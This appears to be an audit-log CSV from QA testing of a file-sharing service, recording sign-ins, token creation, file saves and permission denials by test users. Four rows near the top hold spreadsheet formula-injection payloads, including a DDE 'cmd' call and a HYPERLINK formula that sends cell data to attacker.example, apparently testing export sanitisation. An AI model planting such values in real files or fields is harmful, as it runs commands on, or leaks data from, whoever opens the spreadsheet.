@@ -1,0 +1,328 @@
+time,person,name,action,target,via,ok,ip,detail
+2026-11-13T06:34:47.607907Z,admin,Administrator,token.create,"'@SUM(1+1)*cmd|""/C calc""!A0",web,True,127.0.0.1,"{""scope"": ""read"", ""folders"": null}"
+2026-11-13T06:34:47.603452Z,system,system,signin.password, =1+1,web,False,127.0.0.1,"{""reason"": ""unknown account""}"
+2026-11-13T06:34:47.600514Z,system,system,signin.password,'-2+3+cmd|x,web,False,127.0.0.1,"{""reason"": ""unknown account""}"
+2026-11-13T06:34:47.596923Z,system,system,signin.password,"'=HYPERLINK(""http://attacker.example/?""&A1,""Click"")",web,False,127.0.0.1,"{""reason"": ""unknown account""}"
+2026-11-13T06:34:47.590009Z,maya,Maya Okafor,file.preview,/users/maya/inbox/retest-note.md,web,True,,"{""size"": 5}"
+2026-11-13T06:34:47.584811Z,maya,Maya Okafor,file.preview,/users/maya/inbox/retest-note.md,web,True,,"{""size"": 5}"
+2026-11-13T06:34:47.577506Z,maya,Maya Okafor,signin.password,maya,web,True,127.0.0.1,{}
+2026-11-13T06:34:47.506372Z,jonas,Jonas Lindqvist,signin.password,jonas,web,True,127.0.0.1,{}
+2026-11-13T06:34:47.449438Z,maya,Maya Okafor,file.preview,/users/maya/inbox/retest-note.md,web,True,,"{""size"": 5}"
+2026-11-13T06:34:47.434349Z,maya,Maya Okafor,folder.create,/users/maya/inbox/linkdir,mcp,True,127.0.0.1,"{""token"": ""qa retest (\u2026WnoM)""}"
+2026-11-13T06:34:47.422831Z,maya,Maya Okafor,file.read,/users/maya/inbox/retest-note.md,mcp,True,127.0.0.1,"{""token"": ""qa retest (\u2026WnoM)""}"
+2026-11-13T06:34:47.371058Z,maya,Maya Okafor,file.read,/users/maya/inbox/big.log,mcp,True,127.0.0.1,"{""token"": ""qa retest (\u2026WnoM)""}"
+2026-11-13T06:34:47.363959Z,maya,Maya Okafor,file.save,/users/maya/inbox/big.log,mcp,True,127.0.0.1,"{""version"": 1, ""size"": 2310000, ""project"": null, ""source"": ""mcp"", ""token"": ""qa retest (\u2026WnoM)""}"
+2026-11-13T06:34:47.325004Z,maya,Maya Okafor,denied,/users/jonas/inbox,mcp,False,127.0.0.1,"{""needed"": ""viewer"", ""op"": ""open files"", ""token"": ""qa retest (\u2026WnoM)""}"
+2026-11-13T06:34:47.318855Z,maya,Maya Okafor,file.read,/users/maya/inbox/retest-note.md,mcp,True,127.0.0.1,"{""token"": ""qa retest (\u2026WnoM)""}"
+2026-11-13T06:34:47.313274Z,maya,Maya Okafor,file.read,/users/maya/inbox/bin.png,mcp,True,127.0.0.1,"{""token"": ""qa retest (\u2026WnoM)""}"
+2026-11-13T06:34:47.307460Z,maya,Maya Okafor,file.read,/users/maya/inbox/bin.png,mcp,True,127.0.0.1,"{""token"": ""qa retest (\u2026WnoM)""}"
+2026-11-13T06:34:47.302008Z,maya,Maya Okafor,file.save,/users/maya/inbox/bin.png,mcp,True,127.0.0.1,"{""version"": 1, ""size"": 326, ""project"": null, ""source"": ""mcp"", ""token"": ""qa retest (\u2026WnoM)""}"
+2026-11-13T06:34:47.277366Z,maya,Maya Okafor,file.read,/users/maya/inbox/retest-note.md,mcp,True,127.0.0.1,"{""token"": ""qa retest (\u2026WnoM)""}"
+2026-11-13T06:34:47.269789Z,maya,Maya Okafor,file.save,/users/maya/inbox/retest-note.md,mcp,True,127.0.0.1,"{""version"": 2, ""size"": 5, ""project"": null, ""source"": ""mcp"", ""token"": ""qa retest (\u2026WnoM)""}"
+2026-11-13T06:34:47.260744Z,maya,Maya Okafor,file.save,/users/maya/inbox/retest-note.md,mcp,True,127.0.0.1,"{""version"": 1, ""size"": 5, ""project"": null, ""source"": ""mcp"", ""token"": ""qa retest (\u2026WnoM)""}"
+2026-11-13T06:34:47.229758Z,maya,Maya Okafor,token.create,qa retest,web,True,127.0.0.1,"{""scope"": ""write"", ""folders"": null}"
+2026-11-13T06:34:47.217174Z,admin,Administrator,signin.password,admin,web,True,127.0.0.1,{}
+2026-11-13T06:34:47.147346Z,maya,Maya Okafor,signin.password,maya,web,True,127.0.0.1,{}
+2026-11-13T06:34:33.560346Z,jonas,Jonas Lindqvist,access.denied,/api/fs/delete,web,False,127.0.0.1,"{""method"": ""POST"", ""reason"": ""This folder has its own sharing; only an Owner can delete it""}"
+2026-11-13T06:34:32.500472Z,jonas,Jonas Lindqvist,signin.password,jonas,web,True,127.0.0.1,{}
+2026-11-13T06:34:31.078396Z,maya,Maya Okafor,signin.password,maya,web,True,127.0.0.1,{}
+2026-11-13T06:34:28.833564Z,maya,Maya Okafor,signin.password,maya,web,True,127.0.0.1,{}
+2026-11-13T06:34:08.410028Z,lena,Lena Hartmann,signin.password,lena,web,True,127.0.0.1,{}
+2026-11-13T06:34:04.180158Z,admin,Administrator,audit.export,,web,True,127.0.0.1,"{""rows"": 297}"
+2026-11-13T06:34:01.143729Z,admin,Administrator,user.update,priya,web,True,127.0.0.1,"{""quota_bytes"": 107374182}"
+2026-11-13T06:34:01.129238Z,admin,Administrator,user.update,priya,web,True,127.0.0.1,"{""status"": ""active""}"
+2026-11-13T06:34:01.111257Z,admin,Administrator,user.update,priya,web,True,127.0.0.1,"{""status"": ""suspended""}"
+2026-11-13T06:33:52.355463Z,admin,Administrator,token.create,expiring,web,True,127.0.0.1,"{""scope"": ""read"", ""folders"": null}"
+2026-11-13T06:33:52.307882Z,admin,Administrator,signin.password,admin,web,True,127.0.0.1,{}
+2026-11-13T06:33:50.292633Z,maya,Maya Okafor,access.denied,/api/routing,web,False,127.0.0.1,"{""method"": ""POST"", ""reason"": ""Only admins, or Owners of the target team folder, can manage routing rules""}"
+2026-11-13T06:33:48.939177Z,maya,Maya Okafor,routing.add,/shared/platform-eng/projects/{project},web,True,127.0.0.1,"{""match"": ""git_remote"", ""pattern"": ""github.com/acme/owner-rule*""}"
+2026-11-13T06:33:47.280125Z,admin,Administrator,grant.set,/shared/platform-eng,web,True,127.0.0.1,"{""principal"": ""user:maya"", ""role"": ""owner""}"
+2026-11-13T06:33:47.225982Z,admin,Administrator,signin.password,admin,web,True,127.0.0.1,{}
+2026-11-13T06:33:45.796868Z,maya,Maya Okafor,file.download,/users/maya/inbox/link-target.md,web,True,127.0.0.1,{}
+2026-11-13T06:33:43.614603Z,maya,Maya Okafor,file.download,/users/maya/inbox/dropped.txt,web,True,127.0.0.1,{}
+2026-11-13T06:33:43.518355Z,maya,Maya Okafor,folder.create,/users/maya/inbox/fold-er-deep-deep-deep-deep-deep-deep-deep-deep-deep-deep-deep-deep-deep-deep-deep-deep-deep-deep-deep-deep-deep-deep-deep-deep-deep-deep-deep-deep-deep-deep-,web,True,127.0.0.1,{}
+2026-11-13T06:33:40.581704Z,maya,Maya Okafor,signin.password,maya,web,True,127.0.0.1,{}
+2026-11-13T06:33:38.203805Z,admin,Administrator,signin.password,admin,web,True,127.0.0.1,{}
+2026-11-13T06:33:35.956267Z,maya,Maya Okafor,file.download,/users/maya/inbox/link-target.md,web,True,127.0.0.1,{}
+2026-11-13T06:33:34.584129Z,maya,Maya Okafor,signin.password,maya,web,True,127.0.0.1,{}
+2026-11-13T06:33:30.109292Z,maya,Maya Okafor,file.download,/users/maya/inbox/dropped.txt,web,True,127.0.0.1,{}
+2026-11-13T06:33:30.083202Z,maya,Maya Okafor,file.restore_version,/users/maya/inbox/dropped.txt,web,True,127.0.0.1,"{""restored"": 1}"
+2026-11-13T06:33:30.081951Z,maya,Maya Okafor,file.save,/users/maya/inbox/dropped.txt,web,True,127.0.0.1,"{""version"": 3, ""size"": 12, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:33:27.239881Z,maya,Maya Okafor,file.download,/users/maya/inbox/dropped.txt,web,True,127.0.0.1,{}
+2026-11-13T06:33:27.217660Z,maya,Maya Okafor,file.save,/users/maya/inbox/dropped.txt,web,True,127.0.0.1,"{""version"": 2, ""size"": 33, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:33:25.978991Z,maya,Maya Okafor,file.download,/users/maya/inbox/dropped.txt,web,True,127.0.0.1,{}
+2026-11-13T06:33:25.925928Z,maya,Maya Okafor,file.save,/users/maya/inbox/dropped.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 12, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:33:23.673819Z,maya,Maya Okafor,file.download,/users/maya/inbox/link-target.md,web,True,127.0.0.1,{}
+2026-11-13T06:33:22.424242Z,maya,Maya Okafor,file.download,/users/maya/inbox/link-target.md,web,True,127.0.0.1,{}
+2026-11-13T06:33:22.379880Z,maya,Maya Okafor,file.save,/users/maya/inbox/link-target.md,web,True,127.0.0.1,"{""version"": 1, ""size"": 21, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:33:22.316247Z,maya,Maya Okafor,signin.password,maya,web,True,127.0.0.1,{}
+2026-11-13T06:33:20.605642Z,maya,Maya Okafor,signin.password,maya,web,True,127.0.0.1,{}
+2026-11-13T06:33:16.807541Z,jonas,Jonas Lindqvist,oauth.approve,Edited name,web,True,127.0.0.1,{}
+2026-11-13T06:33:16.583533Z,jonas,Jonas Lindqvist,signin.password,jonas,web,True,127.0.0.1,{}
+2026-11-13T06:32:45.428966Z,jonas,Jonas Lindqvist,access.denied,/api/fs/delete,web,False,127.0.0.1,"{""method"": ""POST"", ""reason"": ""This folder has its own sharing; only an Owner can delete it""}"
+2026-11-13T06:32:44.415159Z,jonas,Jonas Lindqvist,signin.password,jonas,web,True,127.0.0.1,{}
+2026-11-13T06:32:44.144880Z,admin,Administrator,grant.set,/shared/research/locked,web,True,127.0.0.1,"{""principal"": ""user:priya"", ""role"": ""viewer""}"
+2026-11-13T06:32:44.127291Z,admin,Administrator,folder.create,/shared/research/locked,web,True,127.0.0.1,{}
+2026-11-13T06:32:44.068182Z,admin,Administrator,signin.password,admin,web,True,127.0.0.1,{}
+2026-11-13T06:32:40.499860Z,maya,Maya Okafor,item.restore,/users/maya/projects/fold-qa/big,web,True,127.0.0.1,{}
+2026-11-13T06:32:38.016163Z,maya,Maya Okafor,item.delete,/users/maya/projects/fold-qa/big,web,True,127.0.0.1,"{""files"": 55, ""trash"": ""09fe6b08e87e4a229ba9e3b31f622650""}"
+2026-11-13T06:32:35.480859Z,maya,Maya Okafor,item.delete,/users/maya/inbox/sub-renamed,web,True,127.0.0.1,"{""files"": 3, ""trash"": ""3e51fa8a925c4f0cb537ff7c19b4469e""}"
+2026-11-13T06:32:33.295533Z,maya,Maya Okafor,denied,/users/jonas,web,False,127.0.0.1,"{""needed"": ""editor"", ""op"": ""move items here""}"
+2026-11-13T06:32:31.023107Z,maya,Maya Okafor,item.move,/users/maya/projects/fold-qa/sub-renamed,web,True,127.0.0.1,"{""to"": ""/users/maya/inbox/sub-renamed""}"
+2026-11-13T06:32:29.714506Z,maya,Maya Okafor,item.move,/users/maya/projects/fold-qa/sub,web,True,127.0.0.1,"{""to"": ""/users/maya/projects/fold-qa/sub-renamed""}"
+2026-11-13T06:32:22.033624Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f54.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:22.012992Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f53.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.992916Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f52.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.967639Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f51.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.943448Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f50.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.915958Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f49.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.893723Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f48.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.873375Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f47.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.852509Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f46.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.832311Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f45.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.809746Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f44.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.793812Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f43.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.776426Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f42.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.758257Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f41.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.739468Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f40.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.713643Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f39.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.696620Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f38.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.679128Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f37.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.661424Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f36.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.642099Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f35.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.623254Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f34.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.604544Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f33.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.586456Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f32.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.569777Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f31.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.552546Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f30.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.534994Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f29.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.515957Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f28.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.496671Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f27.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.479300Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f26.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.460457Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f25.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.441272Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f24.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.421423Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f23.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.402897Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f22.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.384559Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f21.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.366182Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f20.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.350551Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f19.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.333235Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f18.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.315406Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f17.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.296526Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f16.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.277346Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f15.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.257920Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f14.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.238248Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f13.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.220735Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f12.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.200978Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f11.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.182563Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f10.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 2, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.164117Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f9.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 1, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.145417Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f8.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 1, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.124706Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f7.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 1, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.105122Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f6.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 1, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.085974Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f5.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 1, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.064648Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f4.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 1, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.043284Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f3.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 1, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:21.017805Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f2.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 1, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:20.996095Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f1.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 1, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:20.976195Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/big/f0.txt,web,True,127.0.0.1,"{""version"": 1, ""size"": 1, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:20.950156Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/sub/f2.md,web,True,127.0.0.1,"{""version"": 1, ""size"": 3, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:20.930465Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/sub/f1.md,web,True,127.0.0.1,"{""version"": 1, ""size"": 3, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:20.910933Z,maya,Maya Okafor,file.save,/users/maya/projects/fold-qa/sub/f0.md,web,True,127.0.0.1,"{""version"": 1, ""size"": 3, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:32:20.882423Z,maya,Maya Okafor,folder.create,/users/maya/projects/fold-qa,web,True,127.0.0.1,{}
+2026-11-13T06:32:20.829727Z,maya,Maya Okafor,signin.password,maya,web,True,127.0.0.1,{}
+2026-11-13T06:32:14.407792Z,maya,Maya Okafor,file.preview,/users/maya/inbox/viewer/page.html,web,True,,"{""size"": 286}"
+2026-11-13T06:32:14.402183Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/page.html,web,True,127.0.0.1,{}
+2026-11-13T06:32:13.162793Z,maya,Maya Okafor,file.preview,/users/maya/inbox/viewer/pic.png,web,True,,"{""size"": 135}"
+2026-11-13T06:32:11.911594Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/data.csv,web,True,127.0.0.1,{}
+2026-11-13T06:32:10.669104Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/hostile.md,web,True,127.0.0.1,{}
+2026-11-13T06:32:09.096648Z,jonas,Jonas Lindqvist,file.download,/users/maya/inbox/viewer/data.csv,web,True,127.0.0.1,{}
+2026-11-13T06:32:09.032719Z,jonas,Jonas Lindqvist,signin.password,jonas,web,True,127.0.0.1,{}
+2026-11-13T06:32:08.755413Z,maya,Maya Okafor,grant.set,/users/maya/inbox/viewer,web,True,127.0.0.1,"{""principal"": ""user:jonas"", ""role"": ""viewer""}"
+2026-11-13T06:32:05.617219Z,maya,Maya Okafor,denied,/users/jonas/inbox,web,False,127.0.0.1,"{""needed"": ""viewer"", ""op"": ""open files""}"
+2026-11-13T06:32:02.488250Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/my report (final) 'v2'.md,web,True,127.0.0.1,{}
+2026-11-13T06:32:01.249573Z,maya,Maya Okafor,item.delete,/users/maya/projects/ops-renamed.md,web,True,127.0.0.1,"{""files"": 1, ""trash"": ""3c2d3dce0f864c4a95f5250e8415cf18""}"
+2026-11-13T06:31:58.605292Z,maya,Maya Okafor,file.download,/users/maya/projects/ops-renamed.md,web,True,127.0.0.1,{}
+2026-11-13T06:31:58.585106Z,maya,Maya Okafor,item.move,/users/maya/inbox/viewer/ops-renamed.md,web,True,127.0.0.1,"{""to"": ""/users/maya/projects/ops-renamed.md""}"
+2026-11-13T06:31:57.355002Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/ops-renamed.md,web,True,127.0.0.1,{}
+2026-11-13T06:31:57.334777Z,maya,Maya Okafor,item.move,/users/maya/inbox/viewer/ops.md,web,True,127.0.0.1,"{""to"": ""/users/maya/inbox/viewer/ops-renamed.md""}"
+2026-11-13T06:31:56.049118Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/ops.md,web,True,127.0.0.1,{}
+2026-11-13T06:31:56.005296Z,maya,Maya Okafor,file.save,/users/maya/inbox/viewer/ops.md,web,True,127.0.0.1,"{""version"": 1, ""size"": 5, ""project"": null, ""source"": ""web""}"
+2026-11-13T06:31:54.245170Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/my report (final) 'v2'.md,web,True,127.0.0.1,{}
+2026-11-13T06:31:54.206063Z,maya,Maya Okafor,file.save,/users/maya/inbox/viewer/my report (final) 'v2'.md,web,True,127.0.0.1,"{""unchanged"": true, ""version"": 1}"
+2026-11-13T06:31:52.452664Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/hostile.md,web,True,127.0.0.1,{}
+2026-11-13T06:31:51.618969Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/data.csv,web,True,127.0.0.1,{}
+2026-11-13T06:31:50.825366Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/data.csv,web,True,127.0.0.1,{}
+2026-11-13T06:31:49.804722Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/data.csv,web,True,127.0.0.1,{}
+2026-11-13T06:31:47.632168Z,maya,Maya Okafor,file.preview,/users/maya/inbox/viewer/page.html,web,True,,"{""size"": 286}"
+2026-11-13T06:31:47.627707Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/page.html,web,True,127.0.0.1,{}
+2026-11-13T06:31:44.285370Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/data.csv,web,True,127.0.0.1,{}
+2026-11-13T06:31:43.250987Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/data.csv,web,True,127.0.0.1,{}
+2026-11-13T06:31:42.030446Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/data.csv,web,True,127.0.0.1,{}
+2026-11-13T06:31:40.008114Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/script.py,web,True,127.0.0.1,{}
+2026-11-13T06:31:39.985963Z,maya,Maya Okafor,file.restore_version,/users/maya/inbox/viewer/script.py,web,True,127.0.0.1,"{""restored"": 1}"
+2026-11-13T06:31:39.984069Z,maya,Maya Okafor,file.save,/users/maya/inbox/viewer/script.py,web,True,127.0.0.1,"{""unchanged"": true, ""version"": 4}"
+2026-11-13T06:31:37.620686Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/script.py,web,True,127.0.0.1,{}
+2026-11-13T06:31:37.564904Z,maya,Maya Okafor,file.preview,/users/maya/inbox/viewer/doc.pdf,web,True,,"{""size"": 193}"
+2026-11-13T06:31:36.040590Z,maya,Maya Okafor,file.preview,/users/maya/inbox/viewer/doc.pdf,web,True,,"{""size"": 193}"
+2026-11-13T06:31:34.508262Z,maya,Maya Okafor,file.preview,/users/maya/inbox/viewer/pic.svg,web,True,,"{""size"": 212}"
+2026-11-13T06:31:32.479399Z,maya,Maya Okafor,file.preview,/users/maya/inbox/viewer/page.html,web,True,,"{""size"": 286}"
+2026-11-13T06:31:32.467143Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/page.html,web,True,127.0.0.1,{}
+2026-11-13T06:31:31.433046Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/hostile.md,web,True,127.0.0.1,{}
+2026-11-13T06:31:30.165467Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/data.json,web,True,127.0.0.1,{}
+2026-11-13T06:31:28.157258Z,maya,Maya Okafor,file.preview,/users/maya/inbox/viewer/page.html,web,True,,"{""size"": 286}"
+2026-11-13T06:31:28.152035Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/page.html,web,True,127.0.0.1,{}
+2026-11-13T06:31:26.136791Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/data.json,web,True,127.0.0.1,{}
+2026-11-13T06:31:24.123617Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/data.csv,web,True,127.0.0.1,{}
+2026-11-13T06:31:22.105851Z,maya,Maya Okafor,file.download,/users/maya/inbox/viewer/hostile.md,web,True,127.0.0.1,{}
